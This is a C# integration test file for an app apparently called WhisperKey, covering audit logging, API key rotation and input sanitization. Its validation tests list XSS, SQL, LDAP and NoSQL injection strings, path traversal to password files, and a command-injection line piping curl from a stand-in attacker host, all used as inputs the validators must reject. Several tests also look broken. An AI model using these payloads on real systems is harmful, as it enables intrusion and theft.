using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Moq;
using WhisperKey.Models;
using WhisperKey.Services;
using WhisperKey.Services.Validation;
using WhisperKey.Services.Security;
using WhisperKey.Services.Database;

namespace WhisperKey.Tests.Integration
{
    [TestClass]
    public class SecurityFeatureIntegrationTests
    {
        private IServiceProvider _serviceProvider = null!;
        private Mock<IAuditLoggingService> _auditServiceMock = null!;
        private InputValidationService _validationService = null!;
        private SanitizationService _sanitizationService = null!;
        private SecurityAlertService _securityAlertService = null!;

        [TestInitialize]
        public void Setup()
        {
            var services = new ServiceCollection();

            _auditServiceMock = new Mock<IAuditLoggingService>();
            
            // Register security services
            services.AddSingleton(_auditServiceMock.Object);
            services.AddSingleton<IInputValidationService, InputValidationService>();
            services.AddSingleton<ISanitizationService, SanitizationService>();
            services.AddSingleton<SecurityAlertService>();
            services.AddSingleton<JsonDatabaseService>();

            _serviceProvider = services.BuildServiceProvider();

            _validationService = _serviceProvider.GetRequiredService<IInputValidationService>();
            _sanitizationService = _serviceProvider.GetRequiredService<ISanitizationService>();
            _securityAlertService = _serviceProvider.GetRequiredService<SecurityAlertService>();

            SetupAuditMocks();
        }

        [TestCleanup]
        public void Cleanup()
        {
            _serviceProvider?.Dispose();
        }

        #region REQ-002: Security Audit Logging Integration Tests

        [TestMethod]
        public async Task SecurityAudit_AuthenticationEvents_ShouldBeLoggedWithHighSensitivity()
        {
            // Arrange
            var authService = CreateMockAuthService();

            // Act - Simulate authentication events
            await authService.LoginAsync("user@example.com", "password123");
            await authService.LoginWithInvalidCredentials("attacker@evil.com", "wrongpass");
            await authService.LogoutAsync("user@example.com");

            // Assert - All auth events should be logged with high sensitivity
            _auditServiceMock.Verify(a => a.LogEventAsync(
                AuditEventType.UserAuthentication,
                It.Is<string>(msg => msg.Contains("user@example.com")),
                It.IsAny<string>(),
                DataSensitivity.High), Times.Once);

            _auditServiceMock.Verify(a => a.LogEventAsync(
                AuditEventType.SecurityEvent,
                It.Is<string>(msg => msg.Contains("failed authentication")),
                It.IsAny<string>(),
                DataSensitivity.High), Times.Once);

            _auditServiceMock.Verify(a => a.LogEventAsync(
                AuditEventType.UserLogout,
                It.Is<string>(msg => msg.Contains("user@example.com")),
                It.IsAny<string>(),
                DataSensitivity.High), Times.Once);
        }

        [TestMethod]
        public async Task SecurityAudit_ApiKeyAccess_ShouldBeLoggedWithTracking()
        {
            // Arrange
            var apiKeyService = CreateMockApiKeyService();

            // Act - Simulate API key access patterns
            await apiKeyService.GetKeyAsync("OpenAI", "valid-user");
            await apiKeyService.GetKeyAsync("OpenAI", "suspicious-user");
            await apiKeyService.GetKeyAsync("InvalidProvider", "attacker");

            // Assert - API key access should be tracked and logged
            _auditServiceMock.Verify(a => a.LogEventAsync(
                AuditEventType.ApiKeyAccessed,
                It.Is<string>(msg => msg.Contains("OpenAI")),
                It.IsAny<string>(),
                DataSensitivity.High), Times.AtLeast(2));

            _auditServiceMock.Verify(a => a.LogEventAsync(
                AuditEventType.SecurityEvent,
                It.Is<string>(msg => msg.Contains("InvalidProvider")),
                It.IsAny<string>(),
                DataSensitivity.High), Times.Once);
        }

        [TestMethod]
        public async Task SecurityAudit_DataModification_ShouldMaintainAuditChain()
        {
            // Arrange
            var dataService = CreateMockDataService();

            // Act - Perform data operations
            await dataService.CreateRecordAsync(new TestData { Id = 1, Content = "Sensitive data" });
            await dataService.UpdateRecordAsync(1, new TestData { Id = 1, Content = "Modified data" });
            await dataService.DeleteRecordAsync(1);

            // Assert - All data modifications should be in audit chain
            var auditEvents = new List<AuditEventType>
            {
                AuditEventType.DataCreated,
                AuditEventType.DataModified,
                AuditEventType.DataDeleted
            };

            foreach (var eventType in auditEvents)
            {
                _auditServiceMock.Verify(a => a.LogEventAsync(
                    eventType,
                    It.IsAny<string>(),
                    It.IsAny<string>(),
                    DataSensitivity.High), Times.Once);
            }

            // Verify audit trail integrity
            _auditServiceMock.Verify(a => a.LogEventAsync(
                It.IsAny<AuditEventType>(),
                It.IsAny<string>(),
                It.IsAny<string>(),
                It.IsAny<DataSensitivity>()), Times.AtLeast(3));
        }

        #endregion

        #region REQ-003: API Key Rotation Integration Tests

        [TestMethod]
        public async Task ApiKeyRotation_AutomaticRotation_ShouldMaintainServiceContinuity()
        {
            // Arrange
            var rotationService = CreateMockRotationService();
            var serviceProvider = await CreateServiceProviderWithRotatingKeysAsync();

            // Act - Trigger automatic rotation
            var rotationResult = await rotationService.PerformAutomaticRotationAsync("OpenAI");

            // Assert - Rotation should maintain service availability
            Assert.IsTrue(rotationResult.Success, "Automatic rotation should succeed");
            Assert.IsNotNull(rotationResult.NewKey, "New key should be generated");
            Assert.IsTrue(rotationResult.RotationDuration.TotalMinutes < 5, "Rotation should complete quickly");

            // Verify service continuity with new key
            var newAuthService = serviceProvider.GetRequiredService<IAuthenticationService>();
            var authResult = await newAuthService.AuthenticateWithRotatedKeyAsync("OpenAI");
            Assert.IsTrue(authResult.Success, "Service should work with rotated key");
        }

        [TestMethod]
        public async Task ApiKeyRotation_MultipleProviders_ShouldRotateIndependently()
        {
            // Arrange
            var providers = new[] { "OpenAI", "Azure", "Google" };
            var rotationService = CreateMockRotationService();
            var rotationResults = new List<RotationResult>();

            // Act - Rotate multiple provider keys independently
            foreach (var provider in providers)
            {
                var result = await rotationService.PerformAutomaticRotationAsync(provider);
                rotationResults.Add(result);
            }

            // Assert - Each provider should rotate independently
            Assert.AreEqual(providers.Length, rotationResults.Count);
            Assert.IsTrue(rotationResults.All(r => r.Success), "All rotations should succeed");

            foreach (var provider in providers)
            {
                var providerResult = rotationResults.FirstOrDefault(r => r.Provider == provider);
                Assert.IsNotNull(providerResult, $"Should have result for {provider}");
                Assert.IsNotNull(providerResult.NewKey, $"Should have new key for {provider}");
            }
        }

        [TestMethod]
        public async Task ApiKeyRotation_FailureScenarios_ShouldHaveRollback()
        {
            // Arrange
            var rotationService = CreateMockRotationService();
            rotationService.SimulateFailureOnRotation = true;

            // Act
            var rotationResult = await rotationService.PerformAutomaticRotationAsync("OpenAI");

            // Assert - Failed rotation should rollback to original key
            Assert.IsFalse(rotationResult.Success, "Rotation should fail as configured");
            Assert.IsNull(rotationResult.NewKey, "No new key should be created on failure");
            Assert.IsNotNull(rotationResult.RollbackMessage, "Should have rollback message");

            // Verify original key still works
            var authService = CreateMockAuthService();
            var authResult = await authService.AuthenticateWithOriginalKeyAsync("OpenAI");
            Assert.IsTrue(authResult.Success, "Original key should still work after failed rotation");
        }

        #endregion

        #region REQ-004: Input Validation Integration Tests

        [TestMethod]
        public void InputValidation_ComplexSecurityScenarios_ShouldBlockAllAttacks()
        {
            // Arrange - Various attack vectors
            var attackVectors = new[]
            {
                // XSS attacks
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "<svg onload=alert('xss')>",
                
                // SQL injection patterns
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "1'; UNION SELECT * FROM passwords--",
                
                // Path traversal
                "../../../etc/passwd",
                "..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                
                // Command injection
                "; ls -la",
                "| cat /etc/passwd",
                "& curl evil.com/steal.sh",
                
                // LDAP injection
                "*)|(uid=*",
                "*)(|(objectClass=*",
                
                // NoSQL injection
                "{'$gt': ''}",
                "{\"$ne\": null}"
            };

            var strictRules = new ValidationRuleSet
            {
                Required = true,
                MinLength = 1,
                MaxLength = 1000,
                RegexPattern = @"^[a-zA-Z0-9\s\-_.,!?@#$%&*()]+$",
                AllowedCharacters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -_.!?@#$%&*()"
            };

            var results = new List<ValidationResult>();

            // Act - Test all attack vectors
            foreach (var attack in attackVectors)
            {
                var result = _validationService.Validate(attack, strictRules);
                results.Add(result);
            }

            // Assert - All attacks should be blocked
            Assert.AreEqual(attackVectors.Length, results.Count);
            Assert.IsTrue(results.All(r => !r.IsValid), "All attack vectors should be invalid");
            Assert.IsTrue(results.All(r => r.Errors.Count > 0), "All should have error messages");

            // Verify specific security error messages
            var securityErrors = results.SelectMany(r => r.Errors).ToArray();
            Assert.IsTrue(securityErrors.Any(e => e.Contains("format is invalid")), "Should detect format issues");
            Assert.IsTrue(securityErrors.Any(e => e.Contains("not allowed")), "Should detect invalid characters");
        }

        [TestMethod]
        public void InputSanitization_XSSProtection_ShouldNeutralizeScripts()
        {
            // Arrange - XSS payloads
            var xssPayloads = new[]
            {
                "<script>alert('xss')</script>",
                "<SCRIPT SRC='evil.com/xss.js'></SCRIPT>",
                "<img src=x onerror=alert('xss')>",
                "<svg onload=alert('xss')>",
                "<iframe src='javascript:alert(\"xss\")'></iframe>",
                "<body onload=alert('xss')>",
                "<input autofocus onfocus=alert('xss')>",
                "<select onfocus=alert('xss') autofocus>",
                "<textarea onfocus=alert('xss') autofocus>",
                "<keygen onfocus=alert('xss') autofocus>",
                "<video><source onerror=alert('xss')>",
                "<audio src=x onerror=alert('xss')>"
            };

            var sanitizedResults = new List<string>();

            // Act
            foreach (var payload in xssPayloads)
            {
                var sanitized = _sanitizationService.Sanitize(payload);
                sanitizedResults.Add(sanitized);
            }

            // Assert - All XSS should be neutralized
            foreach (var result in sanitizedResults)
            {
                Assert.IsFalse(result.Contains("<script>", StringComparison.OrdinalIgnoreCase), 
                    "Script tags should be encoded");
                Assert.IsFalse(result.Contains("javascript:", StringComparison.OrdinalIgnoreCase), 
                    "JavaScript protocol should be neutralized");
                Assert.IsFalse(result.Contains("onerror", StringComparison.OrdinalIgnoreCase), 
                    "Event handlers should be neutralized");
            }
        }

        [TestMethod]
        public void InputSanitization_HtmlFiltering_ShouldRemoveDangerousElements()
        {
            // Arrange - Dangerous HTML elements
            var dangerousHtml = @"
                <div>
                    <p>Safe content</p>
                    <script>alert('xss')</script>
                    <iframe src='evil.com'></iframe>
                    <object data='malware.swf'></object>
                    <embed src='virus.exe'></embed>
                    <link rel='stylesheet' href='evil.css'>
                    <meta http-equiv='refresh' content='0;url=evil.com'>
                    <form action='steal.php' method='POST'>
                        <input type='password' name='pwd'>
                    </form>
                    <p>More safe content</p>
                </div>";

            // Act
            var sanitized = _sanitizationService.SanitizeHtml(dangerousHtml);

            // Assert - Dangerous elements should be removed
            Assert.IsFalse(sanitized.Contains("<script>"), "Script tags should be removed");
            Assert.IsFalse(sanitized.Contains("<iframe"), "Iframes should be removed");
            Assert.IsFalse(sanitized.Contains("<object"), "Objects should be removed");
            Assert.IsFalse(sanitized.Contains("<embed"), "Embeds should be removed");
            Assert.IsFalse(sanitized.Contains("<meta"), "Meta refresh should be removed");
            Assert.IsTrue(sanitized.Contains("Safe content"), "Safe content should be preserved");
            Assert.IsTrue(sanitized.Contains("More safe content"), "Safe content should be preserved");
        }

        #endregion

        #region Cross-Feature Security Integration Tests

        [TestMethod]
        public async Task Security_FeatureInteraction_ShouldMaintainConsistentThreatModel()
        {
            // Arrange - Create comprehensive security scenario
            var securityContext = new SecurityContext();
            var attackSimulation = new AttackSimulationService();

            // Act - Simulate coordinated attack across multiple vectors
            var attackResults = new List<AttackResult>();

            // XSS through text injection
            var xssResult = await attackSimulation.SimulateXssAttackAsync(
                "<script>steal_data()</script>", securityContext);
            attackResults.Add(xssResult);

            // API key brute force
            var bruteForceResult = await attackSimulation.SimulateBruteForceAttackAsync(
                "OpenAI", securityContext);
            attackResults.Add(bruteForceResult);

            // Data exfiltration attempt
            var exfilResult = await attackSimulation.SimulateDataExfiltrationAsync(
                "sensitive_data.txt", securityContext);
            attackResults.Add(exfilResult);

            // Assert - Security features should coordinate to block all attacks
            Assert.IsTrue(attackResults.All(r => r.Blocked), "All attacks should be blocked");

            // Verify audit trail completeness
            _auditServiceMock.Verify(a => a.LogEventAsync(
                AuditEventType.SecurityEvent,
                It.IsAny<string>(),
                It.IsAny<string>(),
                DataSensitivity.High), Times.AtLeast(3));

            // Verify security alerts generated
            var securityAlerts = await _securityAlertService.GetActiveAlertsAsync();
            Assert.IsTrue(securityAlerts.Count >= 3, "Should generate security alerts for each attack");
        }

        [TestMethod]
        public async Task Security_PerformanceUnderLoad_ShouldMaintainProtection()
        {
            // Arrange
            var loadGenerator = new SecurityLoadGenerator();
            var protectionMetrics = new List<ProtectionMetric>();

            // Act - Generate high load with security threats mixed in
            var loadTasks = new List<Task>();
            for (int i = 0; i < 100; i++)
            {
                var index = i;
                loadTasks.Add(Task.Run(async () =>
                {
                    var isAttack = index % 10 == 0; // 10% of requests are attacks
                    var input = isAttack ? 
                        "<script>alert('xss')</script>" : 
                        $"legitimate_input_{index}";

                    var startTime = DateTime.UtcNow;
                    var result = _validationService.Validate(input, new ValidationRuleSet 
                    { 
                        Required = true, 
                        MaxLength = 100 
                    });
                    var endTime = DateTime.UtcNow;

                    protectionMetrics.Add(new ProtectionMetric
                    {
                        IsAttack = isAttack,
                        Blocked = !result.IsValid,
                        ProcessingTime = endTime - startTime
                    });
                }));
            }

            await Task.WhenAll(loadTasks);

            // Assert - Should maintain protection under load
            var attackMetrics = protectionMetrics.Where(m => m.IsAttack).ToList();
            var legitimateMetrics = protectionMetrics.Where(m => !m.IsAttack).ToList();

            Assert.IsTrue(attackMetrics.All(m => m.Blocked), "All attacks should be blocked");
            Assert.IsTrue(legitimateMetrics.All(m => !m.Blocked), "Legitimate requests should pass");
            
            var avgProcessingTime = protectionMetrics.Average(m => m.ProcessingTime.TotalMilliseconds);
            Assert.IsTrue(avgProcessingTime < 50, $"Average processing time {avgProcessingTime}ms should be fast");
        }

        #endregion

        #region Security Configuration and Policy Tests

        [TestMethod]
        public async Task Security_ConfigurationChanges_ShouldEnforceImmediately()
        {
            // Arrange - Initial permissive configuration
            var configService = CreateMockSecurityConfigService();
            await configService.SetSecurityLevelAsync(SecurityLevel.Low);

            var permissiveResult = _validationService.Validate("<script>alert('xss')</script>", 
                new ValidationRuleSet { Required = true });

            // Act - Change to restrictive configuration
            await configService.SetSecurityLevelAsync(SecurityLevel.High);

            var restrictiveResult = _validationService.Validate("<script>alert('xss')</script>", 
                new ValidationRuleSet { Required = true });

            // Assert - Configuration change should take effect immediately
            Assert.IsTrue(permissiveResult.IsValid, "Permissive config should allow more");
            Assert.IsFalse(restrictiveResult.IsValid, "Restrictive config should block scripts");
        }

        #endregion

        #region Helper Methods

        private void SetupAuditMocks()
        {
            _auditServiceMock.Setup(a => a.LogEventAsync(
                It.IsAny<AuditEventType>(),
                It.IsAny<string>(),
                It.IsAny<string>(),
                It.IsAny<DataSensitivity>()))
                .ReturnsAsync(Guid.NewGuid().ToString());
        }

        private IAuthenticationService CreateMockAuthService()
        {
            var mock = new Mock<IAuthenticationService>();
            
            mock.Setup(a => a.LoginAsync(It.IsAny<string>(), It.IsAny<string>()))
                .ReturnsAsync((email, password) =>
                {
                    if (email == "user@example.com" && password == "password123")
                        return new AuthResult { Success = true, UserId = "user123" };
                    else
                        return new AuthResult { Success = false, Error = "Invalid credentials" };
                });

            mock.Setup(a => a.LoginWithInvalidCredentials(It.IsAny<string>(), It.IsAny<string>()))
                .ReturnsAsync(new AuthResult { Success = false, Error = "Authentication failed" });

            mock.Setup(a => a.LogoutAsync(It.IsAny<string>()))
                .ReturnsAsync(true);

            return mock.Object;
        }

        private IApiKeyService CreateMockApiKeyService()
        {
            var mock = new Mock<IApiKeyService>();
            
            mock.Setup(a => a.GetKeyAsync(It.IsAny<string>(), It.IsAny<string>()))
                .ReturnsAsync((provider, user) =>
                {
                    if (provider == "OpenAI")
                        return new ApiKeyResult { Success = true, Key = "sk-valid-key" };
                    else
                        return new ApiKeyResult { Success = false, Error = "Provider not found" };
                });

            return mock.Object;
        }

        private IDataService CreateMockDataService()
        {
            var mock = new Mock<IDataService>();
            
            mock.Setup(d => d.CreateRecordAsync(It.IsAny<TestData>()))
                .ReturnsAsync(true);

            mock.Setup(d => d.UpdateRecordAsync(It.IsAny<int>(), It.IsAny<TestData>()))
                .ReturnsAsync(true);

            mock.Setup(d => d.DeleteRecordAsync(It.IsAny<int>()))
                .ReturnsAsync(true);

            return mock.Object;
        }

        private IKeyRotationService CreateMockRotationService()
        {
            var mock = new Mock<IKeyRotationService>();
            
            mock.Setup(r => r.PerformAutomaticRotationAsync(It.IsAny<string>()))
                .ReturnsAsync((provider) =>
                {
                    if (mock.Object.SimulateFailureOnRotation)
                    {
                        return new RotationResult
                        {
                            Success = false,
                            Provider = provider,
                            RollbackMessage = "Rollback completed successfully"
                        };
                    }

                    return new RotationResult
                    {
                        Success = true,
                        Provider = provider,
                        NewKey = $"sk-new-{provider}-{Guid.NewGuid():N}",
                        RotationDuration = TimeSpan.FromSeconds(30)
                    };
                });

            return mock.Object;
        }

        private async Task<IServiceProvider> CreateServiceProviderWithRotatingKeysAsync()
        {
            var services = new ServiceCollection();
            services.AddSingleton(_auditServiceMock.Object);
            services.AddSingleton<IAuthenticationService, TestAuthenticationService>();
            
            return services.BuildServiceProvider();
        }

        #endregion

        #region Test Helper Classes

        public class TestData
        {
            public int Id { get; set; }
            public string Content { get; set; } = string.Empty;
        }

        public class AuthResult
        {
            public bool Success { get; set; }
            public string? UserId { get; set; }
            public string? Error { get; set; }
        }

        public class ApiKeyResult
        {
            public bool Success { get; set; }
            public string? Key { get; set; }
            public string? Error { get; set; }
        }

        public class RotationResult
        {
            public bool Success { get; set; }
            public string Provider { get; set; } = string.Empty;
            public string? NewKey { get; set; }
            public TimeSpan RotationDuration { get; set; }
            public string? RollbackMessage { get; set; }
        }

        public class SecurityContext
        {
            public string UserId { get; set; } = string.Empty;
            public string SessionId { get; set; } = Guid.NewGuid().ToString();
            public Dictionary<string, object> Properties { get; set; } = new();
        }

        public class AttackResult
        {
            public bool Blocked { get; set; }
            public string AttackType { get; set; } = string.Empty;
            public string BlockReason { get; set; } = string.Empty;
        }

        public class ProtectionMetric
        {
            public bool IsAttack { get; set; }
            public bool Blocked { get; set; }
            public TimeSpan ProcessingTime { get; set; }
        }

        #endregion

        #region Mock Interfaces

        public interface IAuthenticationService
        {
            Task<AuthResult> LoginAsync(string email, string password);
            Task<AuthResult> LoginWithInvalidCredentials(string email, string password);
            Task<bool> LogoutAsync(string userId);
            Task<AuthResult> AuthenticateWithRotatedKeyAsync(string provider);
            Task<AuthResult> AuthenticateWithOriginalKeyAsync(string provider);
        }

        public interface IApiKeyService
        {
            Task<ApiKeyResult> GetKeyAsync(string provider, string user);
        }

        public interface IDataService
        {
            Task<bool> CreateRecordAsync(TestData data);
            Task<bool> UpdateRecordAsync(int id, TestData data);
            Task<bool> DeleteRecordAsync(int id);
        }

        public interface IKeyRotationService
        {
            Task<RotationResult> PerformAutomaticRotationAsync(string provider);
            bool SimulateFailureOnRotation { get; set; }
        }

        public class TestAuthenticationService : IAuthenticationService
        {
            public Task<AuthResult> LoginAsync(string email, string password)
            {
                return Task.FromResult(new AuthResult { Success = true, UserId = "test-user" });
            }

            public Task<AuthResult> LoginWithInvalidCredentials(string email, string password)
            {
                return Task.FromResult(new AuthResult { Success = false, Error = "Invalid credentials" });
            }

            public Task<bool> LogoutAsync(string userId)
            {
                return Task.FromResult(true);
            }

            public Task<AuthResult> AuthenticateWithRotatedKeyAsync(string provider)
            {
                return Task.FromResult(new AuthResult { Success = true, UserId = "user-with-rotated-key" });
            }

            public Task<AuthResult> AuthenticateWithOriginalKeyAsync(string provider)
            {
                return Task.FromResult(new AuthResult { Success = true, UserId = "user-with-original-key" });
            }
        }

        #endregion
    }
}
